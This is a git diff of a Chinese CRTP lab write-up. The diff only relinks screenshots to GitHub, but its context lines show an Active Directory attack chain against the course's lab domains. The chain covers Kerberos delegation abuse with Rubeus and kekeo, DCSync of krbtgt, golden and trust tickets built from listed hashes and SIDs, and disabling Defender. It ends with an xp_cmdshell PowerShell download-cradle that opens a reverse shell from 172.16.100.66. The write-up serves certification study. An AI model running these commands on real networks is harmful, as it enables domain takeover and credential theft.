+![image-20220308205741713](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308205741713.png)
 
 
 
@@ -1212,7 +1212,7 @@ PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Admin
 
 如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
 
-![image-20220308210032349](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308210032349.png)
+![image-20220308210032349](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210032349.png)
 
 
 
@@ -1224,7 +1224,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;
 
 测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
 
-![image-20220308210230759](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308210230759.png)
+![image-20220308210230759](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210230759.png)
 
 证明我们已经取得了DA权限
 
@@ -1257,11 +1257,11 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
 ```
 
-![image-20220308210901421](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308210901421.png)
+![image-20220308210901421](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308210901421.png)
 
 开着rebuse.exe不要关闭
 
-![image-20220308211329627](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308211329627.png)
+![image-20220308211329627](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308211329627.png)
 
 回到学生机，执行下面命令
 
@@ -1271,7 +1271,7 @@ Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin
 
 然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
 
-![image-20220308211600888](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308211600888.png)
+![image-20220308211600888](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308211600888.png)
 
 怎么利用TGT？
 
@@ -1291,7 +1291,7 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.
 
 
 
-![image-20220308212032876](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308212032876.png)
+![image-20220308212032876](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212032876.png)
 
 # Learning Objective 18:
 ```Task
@@ -1312,7 +1312,7 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.
 
 
 
-![image-20220308212436558](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308212436558.png)
+![image-20220308212436558](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212436558.png)
 
 留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统
 
@@ -1329,7 +1329,7 @@ websvc：cc098f204c5887eaa8253e7c2749156f
 ### 方法一：kekeo.exe
 使用kekeo的 tgt::ask模块，向websvc请求一个TGT
 
-![image-20220308212646066](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308212646066.png)
+![image-20220308212646066](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212646066.png)
 
 
 
@@ -1343,7 +1343,7 @@ tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.
 
 
 
-![image-20220308212844208](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308212844208.png)
+![image-20220308212844208](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308212844208.png)
 
 生成了一个TGS，使用Invoke-Mimikatz注入到内存当中
 
@@ -1361,7 +1361,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 
 
-![image-20220308213010484](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213010484.png)
+![image-20220308213010484](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213010484.png)
 
 
 
@@ -1375,7 +1375,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
 ```
 
-![image-20220308213134134](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213134134.png)
+![image-20220308213134134](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213134134.png)
 
 
 
@@ -1387,7 +1387,7 @@ ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
 
 
-![image-20220308213205735](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213205735.png)
+![image-20220308213205735](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213205735.png)
 
 
 
@@ -1397,7 +1397,7 @@ ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
 枚举约束委派的计算机，需要用dev版本Powerview
 
-![image-20220308213522734](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213522734.png)
+![image-20220308213522734](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213522734.png)
 
 
 
@@ -1418,7 +1418,7 @@ DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
 tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
 ```
 
-![image-20220308213715680](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213715680.png)
+![image-20220308213715680](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213715680.png)
 
 已生成一个TGT，下面命令生成一个TGS
 
@@ -1428,7 +1428,7 @@ tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.m
 
 
 
-![image-20220308213857744](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308213857744.png)
+![image-20220308213857744](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308213857744.png)
 
 已生成一个TGS
 
@@ -1441,26 +1441,26 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 klist查看
 
-![image-20220308214039249](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308214039249.png)
+![image-20220308214039249](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214039249.png)
 
 执行dcsync，导出dcorp\krbtgt的NTML哈希
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-![image-20220308214144977](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308214144977.png)
+![image-20220308214144977](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214144977.png)
 
 ### 方法二：Rubeus.exe
 
 用Rubeus.exe可以一条命令生成TGT和TGS
 
-![image-20220308214248880](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308214248880.png)
+![image-20220308214248880](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214248880.png)
 
 
 
 klist查看
 
-![image-20220308214350414](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308214350414.png)
+![image-20220308214350414](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214350414.png)
 
 
 
@@ -1470,7 +1470,7 @@ klist查看
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-![image-20220308214435912](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308214435912.png)
+![image-20220308214435912](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308214435912.png)
 
 
 
@@ -1494,7 +1494,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.
 
 在DA权限的shell下枚举所有Trust tikets
 
-![image-20220308215004889](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215004889.png)
+![image-20220308215004889](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215004889.png)
 
 
 
@@ -1514,7 +1514,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:98caa43e727f1dde097803e29ed0c37e /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
 ```
 
-![image-20220308215508398](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215508398.png)
+![image-20220308215508398](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215508398.png)
 
 TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```
 
@@ -1524,15 +1524,15 @@ TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```
 PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 ```
 
-![image-20220308215552249](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215552249.png)
+![image-20220308215552249](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215552249.png)
 
 将 TGS 呈现给目标服务
 
-![image-20220308215621095](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215621095.png)
+![image-20220308215621095](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215621095.png)
 
 现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
 
-![image-20220308215648070](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215648070.png)
+![image-20220308215648070](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215648070.png)
 
 ## 方法2 （Rubeus.exe）
 样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试
@@ -1547,7 +1547,7 @@ PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.m
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 
-![image-20220308215802822](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220308215802822.png)
+![image-20220308215802822](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220308215802822.png)
 
 
 
@@ -1563,7 +1563,7 @@ ls \\mcorp-dc.moneycorp.local\c$
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
 ```
 
-![image-20220309204203132](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309204203132.png)
+![image-20220309204203132](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204203132.png)
 
 
 
@@ -1576,7 +1576,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
 
 
 
-![image-20220309204255324](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309204255324.png)
+![image-20220309204255324](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204255324.png)
 
 使用下面两个命令之一验证上面操作是否成功
 ```
@@ -1587,7 +1587,7 @@ gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 
-![image-20220309204343090](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309204343090.png)
+![image-20220309204343090](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204343090.png)
 
 
 
@@ -1603,7 +1603,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
 
 收到反弹shell
 
-![image-20220309204547148](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309204547148.png)
+![image-20220309204547148](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309204547148.png)
 
 
 
@@ -1627,7 +1627,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollar
 
 
 
-![image-20220309205036099](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309205036099.png)
+![image-20220309205036099](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205036099.png)
 
 
 
@@ -1638,13 +1638,13 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 
 注意上面的sids的参数是Enterprise Admins的MemberSID
 
-![image-20220309205622261](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309205622261.png)
+![image-20220309205622261](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205622261.png)
 
 
 
 执行
 
-![image-20220309205653768](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309205653768.png)
+![image-20220309205653768](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205653768.png)
 
 
 
@@ -1664,7 +1664,7 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
-![image-20220309205854762](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309205854762.png)
+![image-20220309205854762](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309205854762.png)
 
 ## 方法二（rebuse.exe）
 
@@ -1679,7 +1679,7 @@ ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
-![image-20220309210016147](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309210016147.png)
+![image-20220309210016147](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210016147.png)
 
 
 
@@ -1695,7 +1695,7 @@ PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo
 
 
 
-![image-20220309210640825](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309210640825.png)
+![image-20220309210640825](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210640825.png)
 
 
 
@@ -1705,7 +1705,7 @@ PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
 ```
 
-![image-20220309210754615](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309210754615.png)
+![image-20220309210754615](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210754615.png)
 
 
 
@@ -1717,7 +1717,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
  Get-SQLServerLinkCrawl -Instance dcorp-mssql 
 ```
 
-![image-20220309210903705](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309210903705.png)
+![image-20220309210903705](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210903705.png)
 
 下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```
 
@@ -1725,11 +1725,11 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
 ```
 
-![image-20220309210955376](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309210955376.png)
+![image-20220309210955376](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309210955376.png)
 
 下面命令触发一个反弹shell
 ```
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
 ```
 
-![image-20220309211203376](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220309211203376.png)
+![image-20220309211203376](https://github.com/maxzxc0110/hack-study/blob/main/crtp/img/image-20220309211203376.png)
